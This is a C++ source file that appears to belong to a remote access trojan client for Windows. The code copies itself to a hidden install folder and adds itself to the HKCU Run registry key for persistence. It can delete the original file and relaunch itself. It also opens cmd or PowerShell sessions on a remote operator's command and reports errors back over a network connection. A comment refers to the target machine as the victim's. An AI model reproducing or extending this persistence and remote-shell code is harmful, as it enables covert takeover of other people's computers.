//
// Created by Berlingot on 2023-04-20.
//

#include "installationAndStart.h"
#include <process.h>
std::string installationAndStart::CurrentPath;			//current path of executable
std::string installationAndStart::installationFolder;		//path of folder it should be installed to
std::string installationAndStart::installationPath;			//full path where executable should be installed to
bool installationAndStart::installing;			//bool - defines whether the file is currently being installed (and should be terminated after the initiation sequence,


OperationState installationAndStart::init() {
    CurrentPath = getCurrentPath();
    std::cout << "CurrentPath: " << CurrentPath;

    installationFolder = getInstallFolder();
    std::cout << "InstallFolder: " << installationFolder;

    installationPath = getInstallationPath(installationFolder);
    std::cout << "InstallationPath: " << installationPath;

    /*
    if (!(lpArguments == NULL || (lpArguments[0] == 0)) && Settings::meltSelf)		//checks if arguments are supplied (path of old file) and then melts given file (if any)
    {
        remove(lpArguments);
    }
    */
    if (Settings::installSelf)
    {
        if (!locationSet())				//checks if it is at it's destined location (config in settings.h)
        {
            setLocation();
            installing = true;
        }
    }
//TODO RENDU ICITTE
    if (Settings::setStartupSelf)			//checks if it should set itself into startup
    {
        if (!startupSet())				//checks if it's startup is set
        {
            setStartup(Conversion::convStringToWidestring(Settings::startupName).c_str(), Settings::installSelf ? Conversion::convStringToWidestring(installationPath).c_str() : Conversion::convStringToWidestring(CurrentPath).c_str(), NULL);
        }
    }


    runInstalled();			//checks if this run of the instance is designated to the install process, then checks whether it should start the installed client


    return OP_Success;
}

std::string installationAndStart::getInstallFolder() {

    std::string rest;
    if (!(Settings::folderName.empty()))
        rest = "\\" + Settings::folderName;

    std::string concat;
    char* buf = 0;
    size_t sz = 0;
   //int result = _dupenv_s(&buf, &sz, Settings::installLocation.c_str());
    if (const char* env_p = getenv(Settings::installLocation.c_str())) //gets environment variable
        if (env_p != nullptr)
        {
            concat = std::string(env_p) + rest; //concatenates string
            free(buf);
        } else {
            //todo gestion de probleme getpath
        }
    return concat;
}

std::string installationAndStart::getInstallationPath(std::string instFolder) {
    std::string concat;
    concat = instFolder + "\\" + Settings::fileName;

    return concat;
}

std::string installationAndStart::getCurrentPath() {
    char buffer[MAX_PATH];
    GetModuleFileName(0, buffer, MAX_PATH);

    return std::string(buffer);
}

void installationAndStart::setLocation() {
    if (!installationAndStart::directoryExists(installationAndStart::installationFolder.c_str()))
        if (!CreateDirectory(installationAndStart::installationFolder.c_str(), NULL))	//tries to create folder
        {
            //todo fail
        }
    CopyFile(installationAndStart::CurrentPath.c_str(), installationAndStart::installationPath.c_str(), 0);

}

bool installationAndStart::locationSet() {
    if (installationAndStart::CurrentPath == installationAndStart::installationPath)
        return true;
    else
        return false;
}

bool installationAndStart::directoryExists(const char* dirName)			//checks if directory exists
{
    DWORD attribs = ::GetFileAttributesA(dirName);
    if (attribs == INVALID_FILE_ATTRIBUTES)
        return false;
    return true;			//original code : return (attribs & FILE_ATTRIBUTE_DIRECTORY); [CHANGED BC WARNING]
}

void installationAndStart::runInstalled()		//checks if this run of the program is designated to the install process, then checks whether it should start the installed client
{
    if (installationAndStart::installing)
        if (!Settings::startOnNextBoot) // si on doit lancer l'application au démarrage du poste de la vicitme
        {
            installationAndStart::startProcess(installationAndStart::installationPath.c_str(), Settings::meltSelf ? Conversion::convStringToLPTSTR("t " + installationAndStart::CurrentPath) : NULL);		//REPLACE NULL TO, "meltSelf ? 'CURRENTPATH' : NULL"	WHEN CREATEPROCESS FIXED
        }

}

void installationAndStart::startProcess(LPCTSTR lpApplicationName, LPTSTR lpArguments) {

    // additional information
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    // set the size of the structures
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    // start the program up
    CreateProcess(lpApplicationName,   // the path
                  lpArguments,        // Command line
                  NULL,           // Process handle not inheritable
                  NULL,           // Thread handle not inheritable
                  FALSE,          // Set handle inheritance to FALSE
                  0,              // No creation flags
                  NULL,           // Use parent's environment block
                  NULL,           // Use parent's starting directory
                  &si,            // Pointer to STARTUPINFO structure
                  &pi);           // Pointer to PROCESS_INFORMATION structure
    // Close process and thread handles.
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

bool installationAndStart::setStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args) {
    HKEY hKey = NULL;
    LONG lResult = 0;
    bool fSuccess;			//TEMP CHANGE, OLD: BOOL fSuccess = TRUE;
    DWORD dwSize;

    const size_t count = MAX_PATH * 2;
    wchar_t szValue[count] = {};


    wcscpy_s(szValue, count, L"\"");
    wcscat_s(szValue, count, pathToExe);
    wcscat_s(szValue, count, L"\" ");

    if (args != NULL)
    {
        // caller should make sure "args" is quoted if any single argument has a space
        // e.g. (L"-name \"Mark Voidale\"");
        wcscat_s(szValue, count, args);
    }

    lResult = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);

    fSuccess = (lResult == 0);

    if (fSuccess)
    {
        dwSize = (wcslen(szValue) + 1) * 2;
        lResult = RegSetValueExW(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
        fSuccess = (lResult == 0);
    }

    if (hKey != NULL)
    {
        RegCloseKey(hKey);
        hKey = NULL;
    }

    return fSuccess;
}

bool installationAndStart::startupSet() {
    if (installationAndStart::regValueExists(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings::startupName.c_str()))
        return true;
    else
        return false;
}

bool installationAndStart::regValueExists(HKEY hKey, LPCSTR keyPath, LPCSTR valueName) {
    DWORD dwType = 0;
    long lResult = 0;
    HKEY hKeyPlaceholder = NULL;

    lResult = RegOpenKeyEx(hKey, keyPath, NULL, KEY_READ, &hKeyPlaceholder);
    if (lResult == ERROR_SUCCESS)
    {
        lResult = RegQueryValueEx(hKeyPlaceholder, valueName, NULL, &dwType, NULL, NULL);

        if (lResult == ERROR_SUCCESS)
        {
            return true;
        }
        else
            return false;
    }
    else
        return false;
}

std::string installationAndStart::processCommand(std::string command) {
    if (command == "kill")
    {
        //todo killself()
    }
    else if (command == "restart")
    {
       //todo restartSelf();
    }

    else if (processParameter(command, "remoteControl"))
    {
        if (!CMD::cmdOpen)
        {
            if (command == "cmd")
                command = "C:\\WINDOWS\\system32\\cmd.exe";
            else if (command == "pws")
                command = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
            else if (command == "pws32")
                command = "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe";

            if (Utility::fileExists(command))
            {
                char* buffer = new char[command.length() + 3];
                buffer[command.length()] = '\0';
                strcpy_s(buffer, command.length() + 2, command.c_str());

                _beginthreadex(NULL, NULL, (_beginthreadex_proc_type)CMD::cmdThread, (LPVOID)buffer, NULL, NULL);
                while (!CMD::cmdOpen)
                {
                    Sleep(50);
                }
                delete[] buffer;
                return "CMD session opened.";
            }
            else
                return "File doesn't exist.";
        }
        else
        {
            CMD::cmdptr->writeCMD("exit");
            CMD::cmdOpen = false;
            return "CMD session closed";
        }
    }
    else
    {
        return "Command '" + command + "' was not recognized.";
    }
}

void installationAndStart::handleError(int errType, bool errSevere) {
    if (errSevere)
    {
        //todo HAAAAAAAAAAAAAAAAAAAAAAAAAA
    }
    else
    {
        switch (errType)
        {
            case 1:		//general error
                Connexion::connexionptrreference->SendString("General error", MyPNet::PacketType::Warning);
                return;
            case 2:		//cmd error
                Connexion::connexionptrreference->SendString("CMD error", MyPNet::PacketType::Warning);
                return;
            case 3:		//networking error
                Connexion::connexionptrreference->SendString("Networking error", MyPNet::PacketType::Warning);
                return;
        }

    }
}

bool installationAndStart::processParameter(std::string &command, std::string compCommand) {
    std::string::size_type i = command.find(compCommand);
    if (i != std::string::npos)
    {
        command.erase(i, compCommand.length() + 1);
        return true;
    }
    else
        return false;
}
